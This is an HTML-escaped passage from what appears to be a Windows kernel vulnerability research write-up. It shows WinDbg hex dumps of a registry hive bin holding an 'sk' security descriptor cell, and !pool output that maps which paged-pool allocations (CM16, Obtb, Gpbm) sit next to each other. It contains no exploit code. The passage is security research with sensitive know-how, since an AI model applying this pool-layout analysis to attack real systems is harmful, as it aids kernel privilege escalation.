 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8282`8f096060&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-dc&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6c&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;............l!59&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8282`8f096070&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;d0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ea&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;3f&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;............?...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Everything looks good.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;At the start of the page, there is a bin header, and at offset 0x20, we see the first cell corresponding to a security descriptor (&amp;#39;sk&amp;#39;).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Now, let&amp;#39;s see what the !pool command tells us about this address:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;!pool&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f096000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Pool&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f096000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;region&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Paged&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;pool&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*ffff82828f096000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;large&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;allocation,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;tag&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CM16,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;bytes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Pooltag&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CM16&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Internal&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Configuration&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;manager&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;allocations,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Binary&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;nt!cm&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;W&lt;/span&gt;&lt;span&gt;e are dealing with a paged pool allocation of 0x1000 bytes requested by the Configuration Manager.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;And what is located right behind it?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;!pool&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f096000+1000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Pool&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f097000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;region&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Paged&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;pool&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*ffff82828f097000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;large&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;allocation,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;tag&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Obtb,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;bytes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Pooltag&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Obtb&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;tables&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;via&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;EX&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;handle.c,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Binary&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;nt!ob&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;!pool&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f096000+2000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Pool&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f098000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;region&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Paged&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;pool&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*ffff82828f098000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;large&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;allocation,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;tag&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Gpbm,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;bytes&lt;/span&gt;&lt;/p&gt;
